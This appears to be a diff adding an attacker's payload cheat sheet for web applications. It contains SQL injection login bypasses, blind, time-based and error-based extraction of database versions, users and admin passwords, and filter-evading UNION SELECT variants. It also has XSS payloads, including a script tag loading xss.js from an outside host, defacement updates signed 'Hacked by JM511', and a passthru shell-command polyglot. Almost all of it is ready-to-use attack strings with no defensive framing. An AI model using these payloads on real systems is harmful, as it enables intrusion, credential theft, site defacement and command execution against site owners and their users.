@@ -1,0 +1,78 @@
+縗' OR Admin=Admin /*
+1%bf%5c%27//--></SCRIPT>">'><SCRIPT> alert(String.fromCharCode(88, 83, 83))</SCRIPT>--
+縗' admin' or '1'='1
+*'like'
+
+
+http://0z3r00t3r.6te.net/xss.js
+<script type="text/javascript" src="http://0z3r00t3r.6te.net/xss.js"></script>
+
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin') or ('1'='1
+admin" or "1"="1"--
+admin' or '1'='1--
+|
+|-[###############################################################################]-|
+|
+#ASPX read version / db name / user name : 
+
+')and substring(@@version,1,1)=5
+)'and substring(@@version,1,1)=5
+)' and substring(@@version,1,1)=5
+and (select 1)=1
+and substring(@@version,1,1)=5
+and (select 1 from users limit 0,1)=1
+and (select substring(concat(1,user),1,1) from users limit 0,1)=1
+and (select substring(concat(1,pass),1,1) from users limit 0,1)=1
+and (select substring(concat(1,concat(admin,0x3a,pass)),1,1) from admins limit 0,1)=1
+and ascii(substring((SELECT concat(admin,0x3a,pass) from admins limit 0,1),1,1))>68
+code ASCII http://www.commentcamarche.net/base/ascii.php3
+and 1=convert(int,@@version)--
+and 1=convert(int,db_name())--
+and 1=convert(int,user_name())--
+|
+|-[###############################################################################]-|
+|
+#Bypass Union + Select : 
+
+-1%df%27union select 1,user(),3--+
+-1'UnIoN/**/SeLeCT+1,2,3--+-
+' 1+union+select+1,2,3/*
+' 1+union+select+1,2,3/*--
+' 1+union+select+1,2,3--+-
+' 1+un/**/ion+sel/**/ect+1,2,3--
+' 1+un/**/ion+sel/**/ect+1,2,3--+-
+SLEEP(5)--
+SELECT SLEEP(25)--
+SELECT BENCHMARK(1000000,MD5('A'));
+1 OR SLEEP(25)=0 LIMIT 1--
+1) OR SLEEP(25)=0 LIMIT 1--
+1' OR SLEEP(25)=0 LIMIT 1--
+1') OR SLEEP(25)=0 LIMIT 1--
+1)) OR SLEEP(25)=0 LIMIT 1--
+|
+|-[###############################################################################]-|
+|
+#Bypass read database: 
+
+-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
+-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()--+-
+id=1;select+1&id=2,3+from+users+where+id=1--
+id=1;select+1&id=2,3+from+users+where+id=1--+-
+UID=1;select+1&UID=2,3+from+users+where+id=1--
+|
+|-[###############################################################################]-|
+|
+#Bypass AIO SQL / XSS :
+
+'and updatexml(0x3a,concat/*!(0x3a,version())*/,null)--+-
+1%bf%5c%27') and updatexml(0,concat(0x7e,version()),0)--+-
+') having+1=1--
+') update tblfilm SET titel='Hacked by JM511';--
+') update uaefoot_foot SET titel='Hacked by JM511';-- 
+">><</>><</>><<...."><+_...<?>?><>/-!@#'Zero");echo passthru("pwd");exit;and updatexml(0x3a,concat/*!(0x3a,version())*/,null)--+-
+-->'>'/">'</'<'>'><SCRIPT> alert(String.fromCharCode(88, 83))</SCRIPT>--
+',',',',',',',',',',',','000)))))))!/?/*!*/'//--></SCRIPT>"'</'<'>'><SCRIPT> alert(String.fromCharCode(88, 83))</SCRIPT>--  1%bf%5c%27
